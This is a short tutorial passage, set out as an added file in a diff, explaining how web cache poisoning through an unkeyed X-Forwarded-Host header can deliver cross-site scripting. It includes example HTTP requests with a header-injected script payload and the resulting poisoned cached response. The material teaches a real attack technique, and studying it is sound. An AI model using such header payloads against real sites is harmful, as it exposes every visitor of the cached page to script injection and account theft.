@@ -1,0 +1,32 @@
+Using web cache poisoning to deliver an XSS attack
+Perhaps the simplest web cache poisoning vulnerability to exploit is when unkeyed input is reflected in a cacheable response without proper sanitization.
+
+For example, consider the following request and response:
+
+GET /en?region=uk HTTP/1.1
+Host: innocent-website.com
+X-Forwarded-Host: innocent-website.co.uk
+
+
+HTTP/1.1 200 OK
+Cache-Control: public
+<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
+
+
+Here, the value of the X-Forwarded-Host header is being used to dynamically generate an Open Graph image URL, which is then reflected in the response. 
+Crucially for web cache poisoning, the X-Forwarded-Host header is often unkeyed. 
+
+
+
+In this example, the cache can potentially be poisoned with a response containing a simple XSS payload:
+
+GET /en?region=uk HTTP/1.1
+Host: innocent-website.com
+X-Forwarded-Host: a."><script>alert(1)</script>"
+
+HTTP/1.1 200 OK
+Cache-Control: public
+<meta property="og:image" content="https://a."><script>alert(1)</script>"/cms/social.png" />
+
+If this response was cached, all users who accessed /en?region=uk would be served this XSS payload. 
+This example simply causes an alert to appear in the victim's browser, but a real attack could potentially steal passwords and hijack user accounts.
